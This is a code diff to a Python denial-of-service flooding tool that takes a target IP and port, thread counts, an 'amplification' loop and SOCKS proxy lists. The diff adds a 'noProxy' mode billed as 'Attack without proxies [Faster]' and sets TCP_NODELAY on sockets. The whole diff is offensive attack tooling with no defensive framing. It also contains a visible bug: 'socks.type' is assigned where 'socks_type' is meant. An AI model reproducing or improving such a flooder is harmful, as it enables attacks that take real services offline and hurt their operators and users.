@@ -30,6 +30,9 @@ parser.add_argument("-amp", "--amplification", type=str,
 #					default="true", help="• Print Optimization")
 parser.add_argument("-pFile", "--proxiesFile", type=str,
 					default="socks4.txt", help="• Proxies File")
+parser.add_argument("-noP", "--noProxy", type=str,
+					default="false", help="• Attack without proxies [Faster]")
+
 
 args = parser.parse_args()
 
@@ -55,8 +58,11 @@ def flood(event,socks_type):
 			s = socks.socksocket()
 			if socks_type == 4:
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+			if socks_type == 6:
+				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(ip), int(port)))
 			try:
 				for _ in range(amplification):
@@ -174,12 +180,20 @@ def opciones():
 		amplification = int(100)
 	else:
 		amplification = int(amplification)
+	NoProxy = str(input("» NoProxy (BETA [Attack without Proxies <FASTER> ]) true/false: "))
+	if (NoProxy == "true"):
+			socks_type = 6 # No Proxies
+			beta = "True"
+	else:
+			socks.type = choice
+			beta = "False"
 	print("» IP - " + str(ip))
 	print("» Port - " + str(port))
 	print("» Method - " + str(Method))
 	print("» Threads - " + str(thread_num))
 	print("» Socks - " + str(socks_type))
 	print("» Amplification - " + str(amplification))
+	print("» NoProxy - " + str(beta))
 	print("")
 	input("» Press enter «")
 	print("")
@@ -241,13 +255,22 @@ else:
 	out_file = args.proxiesFile
 	proxies = open(out_file).readlines()
 	amplification = int(args.amplification)
+	NoProxy = args.noProxy
+	if (NoProxy == "true"):
+			socks_type = 6 # No Proxies
+			beta = "True"
+	else:
+			socks.type = args.type
+			beta = "False"
 	print("» IP - " + str(ip))
 	print("» Port - " + str(port))
 	print("» Method - " + str(Method))
 	print("» Threads - " + str(thread_num))
 	print("» Socks - " + str(socks_type))
 	print("» Amplification - " + str(amplification))
+	print("» NoProxy - " + str(beta))
 	print("")
 	input("» Press enter «")
 	print("")
 	start()
+
